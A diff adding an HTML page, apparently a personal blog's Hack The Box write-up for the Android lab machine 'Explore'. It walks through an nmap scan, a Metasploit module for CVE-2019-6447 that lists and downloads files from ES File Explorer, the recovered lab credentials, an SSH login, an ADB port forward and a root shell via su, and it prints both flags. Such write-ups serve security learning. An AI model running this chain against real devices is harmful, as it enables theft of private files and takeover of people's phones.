@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- 2022-03-28 Mon 13:31 -->
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB | Explore</title>
+<meta name="generator" content="Org mode">
+<link rel="stylesheet" type="text/css" href="static/style.css" />
+<script type="text/javascript">
+// @license magnet:?xt=urn:btih:e95b018ef3580986a04669f1b5879592219e2a7a&dn=public-domain.txt Public Domain
+<!--/*--><![CDATA[/*><!--*/
+     function CodeHighlightOn(elem, id)
+     {
+       var target = document.getElementById(id);
+       if(null != target) {
+         elem.classList.add("code-highlighted");
+         target.classList.add("code-highlighted");
+       }
+     }
+     function CodeHighlightOff(elem, id)
+     {
+       var target = document.getElementById(id);
+       if(null != target) {
+         elem.classList.remove("code-highlighted");
+         target.classList.remove("code-highlighted");
+       }
+     }
+    /*]]>*///-->
+// @license-end
+</script>
+</head>
+<body>
+<div id="preamble" class="status">
+<div class="header">
+    <a href="index.html">Home</a>
+    <a href="https://github.com/c3lphie">Github</a>
+</div>
+</div>
+<div id="content">
+<header>
+<h1 class="title">HTB | Explore</h1>
+</header><nav id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#org0738360">1. Introduction</a></li>
+<li><a href="#org50cc6f7">2. Recon</a>
+<ul>
+<li><a href="#orga6a3a72">2.1. Nmap</a></li>
+</ul>
+</li>
+<li><a href="#org29bd662">3. Exploitation</a>
+<ul>
+<li><a href="#orgcb451d3">3.1. ES File explorer</a></li>
+<li><a href="#orgb38981e">3.2. Getting access</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</nav>
+<div id="outline-container-org0738360" class="outline-2">
+<h2 id="org0738360"><span class="section-number-2">1</span> Introduction</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+Welcome to this write-up for the easy box named Explore.<br>
+In this write-up we'll attack an android device, showing just how important it is to protect devices other than our pc.<br>
+</p>
+</div>
+</div>
+<div id="outline-container-org50cc6f7" class="outline-2">
+<h2 id="org50cc6f7"><span class="section-number-2">2</span> Recon</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+As always we start doing some recon on the box.<br>
+And we'll quickly find that this isn't a normal box, this is an android phone!<br>
+</p>
+</div>
+<div id="outline-container-orga6a3a72" class="outline-3">
+<h3 id="orga6a3a72"><span class="section-number-3">2.1</span> Nmap</h3>
+<div class="outline-text-3" id="text-2-1">
+<p>
+The result from <code>nmap</code> isn't really that useful as it is filled with a lot of noise.<br>
+</p>
+<pre class="example" id="org7f4074e">
+# Nmap 7.91 scan initiated Mon Jul 26 23:11:21 2021 as: nmap -sC -sV -p- -oA nmap/all_ports -v 10.129.161.205
+Nmap scan report for 10.129.161.205
+Host is up (0.032s latency).
+Not shown: 65531 closed ports
+PORT      STATE    SERVICE VERSION
+2222/tcp  open     ssh     (protocol 2.0)
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-SSH Server - Banana Studio
+| ssh-hostkey: 
+|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
+5555/tcp  filtered freeciv
+38085/tcp open     unknown
+| fingerprint-strings: 
+|   GenericLines: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Mon, 26 Jul 2021 21:12:17 GMT
+|     Content-Length: 22
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line:
+|   GetRequest: 
+|     HTTP/1.1 412 Precondition Failed
+|     Date: Mon, 26 Jul 2021 21:12:17 GMT
+|     Content-Length: 0
+|   HTTPOptions: 
+|     HTTP/1.0 501 Not Implemented
+|     Date: Mon, 26 Jul 2021 21:12:22 GMT
+|     Content-Length: 29
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Method not supported: OPTIONS
+|   Help: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Mon, 26 Jul 2021 21:12:37 GMT
+|     Content-Length: 26
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line: HELP
+|   RTSPRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Mon, 26 Jul 2021 21:12:22 GMT
+|     Content-Length: 39
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     valid protocol version: RTSP/1.0
+|   SSLSessionReq: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Mon, 26 Jul 2021 21:12:37 GMT
+|     Content-Length: 73
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line: 
+|     ?G???,???`~?
+|     ??{????w????&lt;=?o?
+|   TLSSessionReq: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Mon, 26 Jul 2021 21:12:37 GMT
+|     Content-Length: 71
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line: 
+|     ??random1random2random3random4
+|   TerminalServerCookie: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Mon, 26 Jul 2021 21:12:37 GMT
+|     Content-Length: 54
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line: 
+|_    Cookie: mstshash=nmap
+59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
+|_http-title: Site doesn't have a title (text/plain).
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port2222-TCP:V=7.91%I=7%D=7/26%Time=60FF2532%P=x86_64-unknown-linux-gnu
+SF:%r(NULL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port38085-TCP:V=7.91%I=7%D=7/26%Time=60FF2531%P=x86_64-unknown-linux-gn
+SF:u%r(GenericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon
+SF:,\x2026\x20Jul\x202021\x2021:12:17\x20GMT\r\nContent-Length:\x2022\r\nC
+SF:ontent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close
+SF:\r\n\r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x2
+SF:0412\x20Precondition\x20Failed\r\nDate:\x20Mon,\x2026\x20Jul\x202021\x2
+SF:021:12:17\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HT
+SF:TP/1\.0\x20501\x20Not\x20Implemented\r\nDate:\x20Mon,\x2026\x20Jul\x202
+SF:021\x2021:12:22\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20tex
+SF:t/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20n
+SF:ot\x20supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad
+SF:\x20Request\r\nDate:\x20Mon,\x2026\x20Jul\x202021\x2021:12:22\x20GMT\r\
+SF:nContent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-AS
+SF:CII\r\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20ver
+SF:sion:\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\
+SF:r\nDate:\x20Mon,\x2026\x20Jul\x202021\x2021:12:37\x20GMT\r\nContent-Len
+SF:gth:\x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConne
+SF:ction:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessi
+SF:onReq,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon,\x2026\x20
+SF:Jul\x202021\x2021:12:37\x20GMT\r\nContent-Length:\x2073\r\nContent-Type
+SF::\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInv
+SF:alid\x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\
+SF:?`~\?\0\?\?{\?\?\?\?w\?\?\?\?&lt;=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(Termi
+SF:nalServerCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Mon,
+SF:\x2026\x20Jul\x202021\x2021:12:37\x20GMT\r\nContent-Length:\x2054\r\nCo
+SF:ntent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\
+SF:r\n\r\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x2
+SF:0mstshash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request
+SF:\r\nDate:\x20Mon,\x2026\x20Jul\x202021\x2021:12:37\x20GMT\r\nContent-Le
+SF:ngth:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConn
+SF:ection:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x0
+SF:1\0\0e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Jul 26 23:13:53 2021 -- 1 IP address (1 host up) scanned in 151.56 seconds
+</pre>
+
+<p>
+So here is a quick summary of what we found:<br>
+</p>
+<table>
+<caption class="t-above"><span class="table-number">Table 1:</span> Nmap summary</caption>
+
+<colgroup>
+<col  class="org-left">
+
+<col  class="org-left">
+
+<col  class="org-left">
+
+<col  class="org-right">
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="org-left">Service</th>
+<th scope="col" class="org-left">Daemon</th>
+<th scope="col" class="org-left">Version</th>
+<th scope="col" class="org-right">Port</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="org-left">ssh</td>
+<td class="org-left">Banana studio</td>
+<td class="org-left">SSH-2.0-SSH</td>
+<td class="org-right">2222</td>
+</tr>
+
+<tr>
+<td class="org-left">freeciv</td>
+<td class="org-left">?</td>
+<td class="org-left">?</td>
+<td class="org-right">5555</td>
+</tr>
+
+<tr>
+<td class="org-left">unknown</td>
+<td class="org-left">?</td>
+<td class="org-left">?</td>
+<td class="org-right">38085</td>
+</tr>
+
+<tr>
+<td class="org-left">http</td>
+<td class="org-left">Bukkit JSONAPI</td>
+<td class="org-left">3.6.0</td>
+<td class="org-right">59777</td>
+</tr>
+</tbody>
+</table>
+
+<p>
+If we google the ssh server name, we see that it is related to an android app confirming that it is android running.<br>
+</p>
+
+<p>
+Now it would make no sense for a smartphone to be running a minecraft bukkit server now would it?<br>
+</p>
+
+<p>
+<b>Spoiler ALERT</b> it doesn't&#x2026; But google quickly tells us about <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6447">CVE-2019-6447</a>, which basically a backdoor in a File manager (ES File Explorer) for android.<br>
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-org29bd662" class="outline-2">
+<h2 id="org29bd662"><span class="section-number-2">3</span> Exploitation</h2>
+<div class="outline-text-2" id="text-3">
+<p>
+We can use the vulnerability to read files on the machine, and hopefully find some juicy info.<br>
+</p>
+</div>
+<div id="outline-container-orgcb451d3" class="outline-3">
+<h3 id="orgcb451d3"><span class="section-number-3">3.1</span> ES File explorer</h3>
+<div class="outline-text-3" id="text-3-1">
+<p>
+Metasploit has a handy module for exploiting CVE-2019-6447, that we can use for enumerating all kinds of things on the machine.<br>
+We can start by looking at installed apps:<br>
+</p>
+<pre class="example" id="org3f27048">
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTION LISTAPPS
+ACTION =&gt; LISTAPPS
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; run
+
+[+] 10.129.161.205:59777 - Result saved to /home/c3lphie/.msf4/loot/20210726234443_default_10.129.161.205_listApps.json_052153.bin
+[+] 10.129.161.205:59777
+  Google Play Store (com.android.vending) Version: 22.4.25-21 [0] [PR] 337959405
+  Gmail (com.google.android.gm) Version: 2020.05.31.316831277.release
+  ES File Explorer (com.estrongs.android.pop) Version: 4.1.9.7.3
+  Google Play services (com.google.android.gms) Version: 21.02.14 (100800-352619232)
+  SSH Server (net.xnano.android.sshserver) Version: 0.9.1
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</pre>
+<p>
+This more or less just confirmed the findings from the <code>nmap</code> scan.<br>
+</p>
+
+<p>
+We can also look at pictures on the phone:<br>
+</p>
+<pre class="example" id="orga605785">
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTION LISTPICS
+ACTION =&gt; LISTPICS
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; run
+
+[+] 10.129.161.205:59777 - Result saved to /home/c3lphie/.msf4/loot/20210726234637_default_10.129.161.205_listPics.json_068875.bin
+[+] 10.129.161.205:59777
+  concept.jpg (135.33 KB) - 4/21/21 02:38:08 AM: /storage/emulated/0/DCIM/concept.jpg
+  anc.png (6.24 KB) - 4/21/21 02:37:50 AM: /storage/emulated/0/DCIM/anc.png
+  creds.jpg (1.14 MB) - 4/21/21 02:38:18 AM: /storage/emulated/0/DCIM/creds.jpg
+  224_anc.png (124.88 KB) - 4/21/21 02:37:21 AM: /storage/emulated/0/DCIM/224_anc.png
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</pre>
+<p>
+Which proved quite promising with the <code>creds.jpg</code> pricture!<br>
+</p>
+
+<p>
+So let's download <code>creds.jpg</code> and get those juicy secrets<br>
+</p>
+<pre class="example" id="org73e29c1">
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTION GETFILE
+ACTION =&gt; GETFILE
+sf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg
+ACTIONITEM =&gt; /storage/emulated/0/DCIM/creds.jpg
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; run
+
+[+] 10.129.161.205:59777 - /storage/emulated/0/DCIM/creds.jpg saved to /home/c3lphie/.msf4/loot/20210726234846_default_10.129.161.205_getFile_244595.jpg
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</pre>
+
+<p>
+<img src="./assets/creds_explore.jpg" alt="creds_explore.jpg"><br>
+Bingo!<br>
+</p>
+<pre class="example">
+kristi:Kr1sT!5h@Rp3xPl0r3!
+</pre>
+
+<p>
+We can now login with using ssh and get a shell!<br>
+</p>
+</div>
+</div>
+<div id="outline-container-orgb38981e" class="outline-3">
+<h3 id="orgb38981e"><span class="section-number-3">3.2</span> Getting access</h3>
+<div class="outline-text-3" id="text-3-2">
+<p>
+Now that we have credentials, we can just connect through ssh and get user flag!<br>
+</p>
+<pre class="example" id="org33607ae">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/explore ]
+└─&gt; $ ssh explore.htb                                               
+Password authentication
+(kristi@10.129.161.205) Password:
+:/ $ whoami
+u0_a76
+:/ $ ls
+acct                   init.superuser.rc       sbin
+bin                    init.usb.configfs.rc    sdcard
+bugreports             init.usb.rc             sepolicy
+cache                  init.zygote32.rc        storage
+charger                init.zygote64_32.rc     sys
+config                 lib                     system
+d                      mnt                     ueventd.android_x86_64.rc
+data                   odm                     ueventd.rc
+default.prop           oem                     vendor
+dev                    plat_file_contexts      vendor_file_contexts
+etc                    plat_hwservice_contexts vendor_hwservice_contexts
+fstab.android_x86_64   plat_property_contexts  vendor_property_contexts
+init                   plat_seapp_contexts     vendor_seapp_contexts
+init.android_x86_64.rc plat_service_contexts   vendor_service_contexts
+init.environ.rc        proc                    vndservice_contexts
+init.rc                product
+:/ $ ls sdcard
+Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt
+Android Download Music  Pictures      Ringtones dianxinos
+:/ $ cd sdcard
+:/sdcard $ cat user.txt
+f32017174c7c7e8f50c6da52891ae250
+:/sdcard $
+</pre>
+
+<p>
+Next thing we can do tunnel the port to get a connection to the <code>freeciv</code> port which is meant for Android Debugging Bridge.<br>
+</p>
+<pre class="example" id="org960d353">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/explore ]
+└─&gt; $ ssh explore.htb -L 5555:127.0.0.1:5555 
+Password authentication
+(kristi@10.129.161.205) Password:
+:/ $
+</pre>
+
+<p>
+Now we can connect with adb<br>
+</p>
+<pre class="example">
+$ adb connect 127.0.0.1:5555
+</pre>
+
+
+<p>
+And the use <code>adb shell</code> to get a basic shell, that we can upgrade to root using <code>su</code><br>
+</p>
+<pre class="example" id="org8e0da2d">
+
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/explore ]
+└─&gt; $ adb shell                                                     1:12
+x86_64:/ $ su
+:/ #
+</pre>
+
+<p>
+And then finally get the root flag<br>
+</p>
+<pre class="example" id="orgeac155a">
+1|:/ # ls data
+adb           bootchart     media       property       tombstones
+anr           cache         mediadrm    resource-cache user
+app           dalvik-cache  misc        root.txt       user_de
+app-asec      data          misc_ce     ss             vendor
+app-ephemeral drm           misc_de     ssh_starter.sh vendor_ce
+app-lib       es_starter.sh nfc         system         vendor_de
+app-private   local         ota         system_ce
+backup        lost+found    ota_package system_de
+:/ # cd data/
+:/data # cat root.txt
+f04fc82b6d49b41c9b08982be59338c5
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<div class="footer">
+    <div id="copyright">
+        <small>&copy; Copyright 2022, C3lphie</small>
+    </div>
+</div>
+</div>
+</body>
+</html>
